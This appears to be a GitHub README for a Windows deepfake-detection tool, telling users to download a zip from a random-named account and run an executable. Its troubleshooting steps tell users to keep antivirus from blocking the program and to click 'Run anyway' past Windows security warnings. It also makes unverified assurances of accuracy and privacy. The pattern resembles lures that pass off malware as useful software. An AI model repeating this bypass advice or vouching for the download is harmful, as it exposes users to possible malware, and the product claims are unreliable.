# 🔍 human-centric-deepfake-detection - Identify fake images with simple tools

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Candid-frothiness23/human-centric-deepfake-detection/releases)

This software detects AI-generated images. It uses models to check if a person in a photo is real or fake. You get an answer based on visual analysis.

## ⚙️ System Requirements

Your computer needs these items to run the program correctly:

- Windows 10 or Windows 11.
- An internet connection for the first setup.
- At least 8 gigabytes of RAM.
- A modern processor.
- A storage drive with 500 megabytes of free space.

## 📦 How to Download and Install

Follow these steps to get the software on your computer:

1. Visit the [releases page](https://github.com/Candid-frothiness23/human-centric-deepfake-detection/releases) to download the archive.
2. Look for the file ending in .zip in the most recent release.
3. Click the file to save it to your computer.
4. Open your Downloads folder.
5. Right-click the file and select "Extract All" to see the folder contents.
6. Open the folder you just created.
7. Locate the file named `run_detector.exe`.
8. Double-click this file to start the system.

A black window will appear on your screen. Keep this window open. It runs the background tasks for the detector. After a few seconds, your web browser will open automatically and display the program interface.

## 🖥️ How to Use the Detector

The interface appears in your web browser. You do not need to be online to use the tool once it starts.

1. Locate the button labeled "Upload Image."
2. Select a photo from your computer.
3. Wait for the system to process the image.
4. Read the result on the screen. The system indicates if the image is real or fake.
5. View the confidence score. This number tells you how sure the system is about its decision.
6. Use the explanation panel to see which parts of the image triggered the result.

## 📉 Troubleshooting Common Issues

Check these items if the program does not start:

- Ensure your antivirus software does not block the application. You might need to click "Run anyway" if Windows displays a security warning.
- Close other memory-heavy programs if your computer feels slow.
- Restart the `run_detector.exe` file if the browser window does not open after one minute.
- Check that your file path does not contain special characters or symbols. Move the folder to your Desktop if errors persist.

## 📋 Understanding the Technology

This program uses deep learning. It treats an image as data and compares it against patterns found in thousands of known real and fake pictures. 

- PyTorch manages the math behind the visual analysis.
- ResNet18 serves as the brain that classifies the image.
- Streamlit provides the buttons and text you see in your browser.

The tool performs image preprocessing to normalize colors and sizes before the model inspects the pixels. This ensures consistently accurate results regardless of the original image quality.

## 🔒 Your Privacy

This software runs locally on your machine. No images you upload leave your personal computer. The detection occurs on your hardware, ensuring your search history and private photos stay private. The system does not collect user data or usage statistics.

## 🛠️ Performance Tips

- Use high-resolution images for the best accuracy.
- Avoid blurry or highly compressed images as they may confuse the detector.
- You can process several images in a row. The system reset occurs automatically between uploads.

Keywords: artificial-intelligence, computer-vision, deepfake, deepfake-detection, image-classification, machine-learning, python, pytorch, resnet18, streamlit